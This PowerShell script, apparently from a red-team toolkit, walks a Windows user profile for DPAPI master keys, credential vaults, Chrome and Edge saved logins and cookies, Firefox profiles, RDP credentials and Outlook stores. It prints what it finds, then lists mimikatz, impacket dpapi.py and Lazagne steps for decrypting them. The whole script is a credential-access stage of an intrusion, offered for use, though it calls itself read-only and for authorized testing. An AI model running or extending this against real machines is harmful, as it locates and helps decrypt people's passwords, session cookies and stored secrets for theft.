<#
.SYNOPSIS
    Enumerate DPAPI master keys, credential vaults, and Chrome/Edge/Firefox
    encrypted credential stores accessible to the current user. **Location
    only — no decryption attempted.**

.DESCRIPTION
    DPAPI-protected blobs are the typical "next step after foothold" target —
    once you have an interactive session as a user, their master keys decrypt
    everything stored under that user's DPAPI context (Chrome cookies, RDP
    saved creds, Outlook stored passwords, etc.).

    This script ONLY enumerates the PATHS to the blobs. Actual decryption
    is operator-driven (mimikatz dpapi::masterkey, Lazagne, dpapi.py).

.NOTES
    Authorized testing only. Read-only. Per CLAUDE.md §9 invariant 1.
#>
[CmdletBinding()]
param()

function Hit($t)  { Write-Host "[+] $t" -ForegroundColor Green }
function Miss($t) { Write-Host "[-] $t" -ForegroundColor DarkGray }
function Hdr($t)  { Write-Host ""; Write-Host ("="*70) -ForegroundColor Cyan
                    Write-Host "  $t" -ForegroundColor Cyan
                    Write-Host ("="*70) -ForegroundColor Cyan }

Hdr "DPAPI MASTER KEYS + CREDENTIAL VAULTS (LOCATION ONLY)"

$paths = @(
    @{ Type = "Master Keys (user)";       P = "$env:APPDATA\Microsoft\Protect" },
    @{ Type = "Master Keys (LOCAL_USER)"; P = "$env:LOCALAPPDATA\Microsoft\Protect" },
    @{ Type = "Credential vault";         P = "$env:APPDATA\Microsoft\Credentials" },
    @{ Type = "Credential vault (Local)"; P = "$env:LOCALAPPDATA\Microsoft\Credentials" },
    @{ Type = "Vault metadata";           P = "$env:LOCALAPPDATA\Microsoft\Vault" },
    @{ Type = "Chrome Local State";       P = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" },
    @{ Type = "Chrome Login Data";        P = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" },
    @{ Type = "Chrome Cookies";           P = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" },
    @{ Type = "Edge Local State";         P = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" },
    @{ Type = "Edge Login Data";          P = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" },
    @{ Type = "Firefox profiles";         P = "$env:APPDATA\Mozilla\Firefox\Profiles" },
    @{ Type = "RDP saved creds";          P = "$env:LOCALAPPDATA\Microsoft\Remote Desktop\1.0\.rdp" },
    @{ Type = "Outlook PST/OST";          P = "$env:LOCALAPPDATA\Microsoft\Outlook" }
)

foreach ($entry in $paths) {
    $type = $entry.Type
    $p    = $entry.P
    if (Test-Path -LiteralPath $p) {
        if ((Get-Item $p -ErrorAction SilentlyContinue).PSIsContainer) {
            $items = Get-ChildItem -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue
            if ($items) {
                Hit "$type ($($items.Count) item(s) under $p)"
                $items | Select-Object -First 5 | ForEach-Object { "    $($_.FullName)" }
                if ($items.Count -gt 5) { "    ... and $($items.Count - 5) more" }
            } else {
                Miss "$type exists but empty: $p"
            }
        } else {
            Hit "$type -> $p"
        }
    }
}

Hdr "NEXT STEPS (operator-driven)"
"# DPAPI decryption — requires the user's password OR the user's NTLM hash OR system-level access:"
"#   mimikatz `dpapi::masterkey /in:<master-key> /password:<user-password>`"
"#   impacket dpapi.py masterkey -file <master-key> -password <user-password>"
"#"
"# Chrome / Edge cookies + saved logins use AES-GCM with a DPAPI-wrapped key in 'Local State'."
"# Lazagne automates the full chain — run as the user. NEVER as SYSTEM (different DPAPI scope)."
